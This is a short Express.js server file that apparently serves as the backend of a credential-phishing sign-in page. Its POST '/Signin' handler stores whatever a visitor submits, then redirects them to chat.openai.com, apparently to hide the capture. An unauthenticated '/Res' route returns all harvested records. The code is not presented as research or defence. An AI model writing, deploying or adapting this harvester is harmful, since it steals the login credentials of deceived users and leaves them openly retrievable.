import  Express  from "express"; 
import connect from "./DB/index.js";
import bodyParser from "body-parser";
import path from "path"
import posts from "./Model/Post.js";




const server = Express()


server.use(bodyParser.json())
server.use(Express.static(path.join("../Front" , "dist")))

server.get("/" , (req , res)=>{
    const indexpath = path.resolve("../Front" , "dist" , "index.html")
    res.sendFile(indexpath)
})
server.get("/Signin" , (req , res)=>{
    const indexpath = path.resolve("../Front" , "dist" , "index.html")
    res.sendFile(indexpath)
}) 
server.get("/Data" , (req , res)=>{

    const indexpath = path.resolve("../Front" , "dist" , "index.html")
    res.sendFile(indexpath)
}) 

server.post("/Signin" , async(req , res)=>{
    

    let obj = req.body
    console.log(obj)
    const postData = new posts(obj)
    let redirect = await postData.save()
    res.redirect(302 , 'https://chat.openai.com/')
})

server.get("/Res", async (req, res) => {
 
    const postData = await posts.find({});
    res.send(postData);
    // console.log(postData)
   
});






connect.then(()=>{
    server.listen(3500 , ()=>{

        console.log("welcome to our web ")
    })
}).catch((err)=>{
    console.log(err)
})

